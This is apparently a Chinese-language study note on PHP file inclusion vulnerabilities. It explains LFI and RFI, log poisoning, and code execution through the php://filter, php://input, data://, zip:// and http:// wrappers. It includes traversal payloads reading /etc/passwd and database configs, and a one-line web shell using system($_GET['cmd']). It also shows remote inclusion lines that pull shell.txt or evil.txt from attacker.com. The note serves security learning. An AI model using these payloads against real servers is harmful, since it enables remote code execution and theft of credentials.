==核心过滤器消除字符技巧==

1. `convert.base64-decode`：非字符自动忽略机制

原理

PHP 的 `base64_decode` 过滤器在解码时，会**自动忽略所有非 Base64 字母表内的字符**（即非 ==`a-z`, `A-Z`, `0-9`, `+`, `/`== 的字符，如 `<`, `>`, `?`, `;`, `(`, `)`, 空格等）。

字符计算与对齐
`<?php exit();?>` 中过滤掉非法字符后，剩余的有效 Base64 字符为：
`p`, `h`, `p`, `e`, `x`, `i`, `t`（共 **7** 个字符）。

Base64 以 **4 字节** 为一组进行解码：

- 7 字节无法对齐（$7 \pmod 4 = 3$），需要补充 **1 个 Base64 字符**（例如 `a`）凑满 8 字节。
    
- 解码后，这 8 个字符会变成 6 字节的不可读乱码，而后面的 Payload 能正常被解码







# php文件包含漏洞原理介绍
文件包含漏洞（File Inclusion Vulnerability）==是在开发过程中，为了代码复用，程序动态引入外部文件（如模板、配置文件），但未对用户可控的文件名或路径参数进行严格过滤与校验，导致攻击者能够控制包含的文件路径==

PHP 在执行包含函数时，**无论目标文件的扩展名是什么（如 `.txt`、`.jpg`、`.log`），都会尝试将其中的内容当作 PHP 代码进行解析执行；若文件中无 PHP 标签，则直接输出其原始内容**

1.  核心触发机制与成因

PHP 提供了四个核心文件包含函数：

- `include()` / `include_once()`：找不到文件时抛出 `Warning`，脚本继续执行。
    
- `require()` / `require_once()`：找不到文件时抛出 `Fatal Error`，脚本立即中断


2. 漏洞分类与利用场景

![](Pasted%20image%2020260829122339.png)


==本地文件包含 (LFI - Local File Inclusion)==

攻击者通过操控参数，包含服务器本地已存在的文件。

- **目录穿越与敏感文件读取：** 结合 `../` 向上跳级读取系统或配置文件。
    
    - `?page=../../../../etc/passwd`（读取 Linux 用户信息）
        
    - `?page=../../../../windows/win.ini`（读取 Windows 配置文件）
        
    - `?page=../config/database.php`（查看数据库配置）

- **结合其他机制实现 RCE（远程代码执行）：**
    
    - **日志投毒（Log Poisoning）：** 在 HTTP 请求头（如 `User-Agent`）中注入恶意 PHP 代码，服务器将请求写入 access log，再通过 LFI 包含该日志文件执行恶意代码。
        
    - **Session 文件包含：** 若 session 内容可控且存储路径已知，可向 session 中写入恶意代码并通过 LFI 包含。
        
    - **临时文件 / 上传图片马包含：** 上传带有 PHP 脚本的图片或利用 PHP 上传临时文件机制，再用包含函数解析执行


==远程文件包含 (RFI - Remote File Inclusion)==

==攻击者传入一个外部可访问的 URL 地址，使目标服务器下载并执行远程服务器上的恶意代码。==

- **触发前提（`php.ini` 配置）：**
    
    - `allow_url_fopen = On`（默认开启）
        
    - `allow_url_include = On`（PHP 5.2 后默认为 **Off**）

- **攻击 Payload：**
    
    - `?page=[http://attacker.com/evil.txt](http://attacker.com/evil.txt)`（`evil.txt` 中包含 `<?php system($_GET['cmd']); ?>`）

# php伪协议协同php文件包含完成文件读取

## 利用php伪协议完成文件读取
PHP 伪协议（PHP Wrapper Streams）是 PHP 提供的内置 URL 风格封装协议。在 Web 安全中，当目标程序存在**文件包含（LFI）** 或**任意文件读取**漏洞，且输入参数可控时，攻击者常利用伪协议绕过代码执行限制、直接读取敏感源码或系统配置文件


### 使用`php://filter`进行文件读取


- 直接发送文件名
- `php`：`//filter`来读取其编码后的信息
	- `include $_GET[1];       //1=index.php`
	- `//php://filter/read=convert.base64_encode/resource=index.php`




- 核心伪协议读取文件详解

1. `php://filter`（最常用的源码读取方案）

当遇到 `include($file)` 且目标为 `.php` 文件时，直接包含会导致代码在服务端被解析执行，而无法看到源码。`php://filter` 可以在文件被解析前，先经过流过滤器编码（如 Base64），使服务器将其视为普通纯文本输出。

- **基础语法：**
```
php://filter/read=convert.base64-encode/resource=<目标文件路径>
```

(注：`read=` 可省略，部分场景简写为 `php://filter/convert.base64-encode/resource=index.php`)

### 使用`php://input`进行代码执行
`php://input` 是最直接==将 POST 数据流当作 PHP 脚本执行的协议==

1. ==原理概述==

- **`php://input` 是什么**：PHP 提供的一个只读数据流，用于访问请求体中的原始 POST 数据（Raw POST Data）。
- **为何会触发代码执行**：当目标代码使用 `include`、`require`、`include_once` 或 `require_once` 包含由外部控制的参数，且参数值为 `php://input` 时，PHP 解释器会将 HTTP 请求体（POST Body）中的内容作为包含文件的内容进行解析。如果请求体中包含合法的 PHP 代码标签（如 `<?php ... ?>`），PHP 就会直接解析并执行该段代码

1. ==利用前置条件与约束==

| **配置 / 条件**             | **要求**         | **说明**                                                                                                            |
| ----------------------- | -------------- | ----------------------------------------------------------------------------------------------------------------- |
| **`allow_url_include`** | **`On`**       | 必须开启。`php://input` 被 PHP 视为外部 URL 资源，此项为核心开关（PHP 5.2.0 起默认 `Off`）。                                                |
| **`allow_url_fopen`**   | `On` / `Off`   | 无论开启与否均可触发（部分环境下 `allow_url_include` 开启需依赖该项）。                                                                    |
| **包含路径无后缀拼接**           | 必须             | 漏洞代码形如 `include($_GET['file'])`。若形如 `include($_GET['file'] . '.php')`，协议名会变成 `php://input.php` 导致解析失败。            |
| **请求体类型（Content-Type）** | 避免 `multipart` | 当 `enctype="multipart/form-data"` 时，`php://input` 无法获取数据。通常设为 `text/plain` 或 `application/x-www-form-urlencoded`。 |

### 使用`data://`伪协议进行代码执行
在 PHP 文件包含漏洞中，`data://` 伪协议（RFC 2397 数据流封装协议）允许将外部输入直接以内联数据（Data URI）的形式提供给解析器。配合 `include` / `require` 时，==攻击者无需借助文件上传或请求体，即可直接在 URL 参数中嵌入 PHP 脚本并触发远程代码执行（RCE）==


1. ==原理概述==

- **`data://` 的功能**：通过 `data:[<mediatype>][;base64],<data>` 格式直接内联传递数据流。

- **代码执行机理**：当 `include($_GET['file'])` 接收到一个合法的 `data://` 协议字符串时，PHP 会把协议中包含的数据作为文件源码加载。若数据中含有 `<?php ... ?>` 标签，解释器会当场解析并执行该段代码。

- **与 `php://input` 的差异**：`php://input` 必须依赖 HTTP POST 请求体；而 `data://` 可以直接附带在 HTTP GET 请求的 URL Query 参数中，且原生支持 Base64 编码，便于规避 WAF 和特殊字符过滤


1. ==利用前置条件==

|**配置 / 条件**|**要求**|**说明**|
|---|---|---|
|**`allow_url_include`**|**`On`**|必须开启。PHP 将 `data://` 视为外部资源包装器（PHP 5.2.0 起默认 `Off`）。|
|**`allow_url_fopen`**|**`On`**|必须开启。在部分 PHP 版本中，`data://` 数据流需要该配置支持。|
|**包含参数无硬编码后缀**|必须|若代码为 `include($file . '.php')`，拼接会导致 Data URI 语法损坏无法解析。|

3. ==构造格式==

`data://` 协议主要支持以下两种表达形式：

- ① 明文文本格式
```
data://text/plain,< <?php phpinfo(); ?>  >
# 或省略双斜线
data:text/plain,< <?php phpinfo(); ?>  >
```


- ② Base64 编码格式
```
data://text/plain;base64,<PD9waHAgcGhwaW5mbygpOz8+>
# 或省略双斜线
data:text/plain;base64,<PD9waHAgcGhwaW5mbygpOz8+>
```

### 使用`zip://`伪协议进行代码执行
在 PHP 文件包含漏洞中，`zip://` 伪协议属于**压缩流封装协议**。与 `php://input` 和 `data://` 不同，`zip://` **不需要开启 `allow_url_include`**，它被 PHP 视为本地流包装器。

只要目标系统存在**任意文件上传点**（即使只能上传图片、文档等受限扩展名），且存在本地文件包含（LFI）漏洞，攻击者即==可通过 `zip://` 解压并执行被包含在压缩包内的 PHP 代码，从而实现 RCE==

1. ==原理概述==

- **`zip://` 的功能**：用于访问和提取 ZIP 压缩包内部的单个子文件。

- **基本语法格式**：
```
zip://<压缩包的完整物理路径>#<压缩包内的子文件名>
```

- **代码执行机理**：
    
    1. 攻击者将恶意 PHP 脚本打包进一个 ZIP 压缩包。
        
    2. 将该 ZIP 压缩包更名（例如改名为 `.jpg` 或 `.png`）并上传至目标服务器。
        
    3. 通过文件包含漏洞，利用 `zip://` 协议定位并解析该图片文件内的 PHP 脚本。PHP 会自动解压并直接解析执行该脚本


2. ==利用前置条件与特性对比==

| **条件 / 特性**             | **要求**             | **说明**                                                            |
| ----------------------- | ------------------ | ----------------------------------------------------------------- |
| **`allow_url_include`** | **`Off`（无需开启）**    | `zip://` 是处理本地文件的流包装器，不受此选项限制。                                    |
| **`allow_url_fopen`**   | **`Off`（无需开启）**    | 同样不受此配置限制，适应极度苛刻的默认安全配置。                                          |
| **可写目录 / 上传点**          | **必须具备**           | 必须能将构造好的 ZIP 包上传或写入到目标服务器的文件系统上。                                  |
| **路径形式**                | **必须为绝对路径**        | `zip://` 对相对路径支持不佳，通常必须提供压缩包在服务器上的**完整绝对物理路径**。                   |
| **URL 编码要求**            | **`#` 需转义为 `%23`** | 协议中分隔压缩包路径与子文件名的 `#` 在 HTTP 请求中会被当作 URL 锚点（Fragment），必须进行 URL 编码。 |

### 使用`http://`与`https://`伪协议进行代码执行
在 PHP 文件包含漏洞中，使用 `http://` 或 `https://` 封装协议（URL Wrappers）加载外部恶意代码的方式被称为**远程文件包含（Remote File Inclusion, RFI）**。

当后端代码将未经过滤的用户输入直接传递给 `include` / `require` 时，PHP 会向攻击者控制的远程服务器发起 HTTP/HTTPS GET 请求，拉取远程文件内容，并在目标服务器本地直接作为 PHP 代码进行解析与执行


1. ==原理概述==

- **URL 流封装协议机制**：PHP 内置支持通过 `http://` 和 `https://` 协议读取远程资源。

- **代码执行机理**：
    
    1. 攻击者在一台公网服务器上搭建 Web 服务，存放包含恶意 PHP 代码的纯文本文件（例如 `shell.txt`）。
        
    2. 目标服务器存在文件包含漏洞，攻击者传入形如 `?file=[http://attacker.com/shell.txt](http://attacker.com/shell.txt)` 的参数。
        
    3. 目标服务器的 PHP 引擎主动向 `attacker.com` 请求 `shell.txt`，获取其响应正文。
        
    4. PHP 引擎直接将接收到的内容放入本地解释器中编译执行，触发 RCE


2. ==利用前置条件与配置要求==

|**配置 / 条件**|**要求**|**说明**|
|---|---|---|
|**`allow_url_include`**|**`On`**|**核心开关**。PHP 5.2.0 起默认设为 `Off`，必须显式开启才允许包含 URL 资源。|
|**`allow_url_fopen`**|**`On`**|**必须开启**。默认处于 `On` 状态，负责允许打开 URL 形式的文件对象。|
|**OpenSSL 扩展**|包含 `https://` 时需要|若使用 `https://` 协议，目标 PHP 必须启用 `openssl` 扩展；`http://` 则无此依赖。|
|**出网能力**|**必须**|目标服务器必须具备访问外网（或攻击者所在内网节点）的访问权限，不能被防火墙拦截出站请求。|

1. 目标服务器发起网络请求：`GET [http://attacker.local/shell.txt](http://attacker.local/shell.txt)`
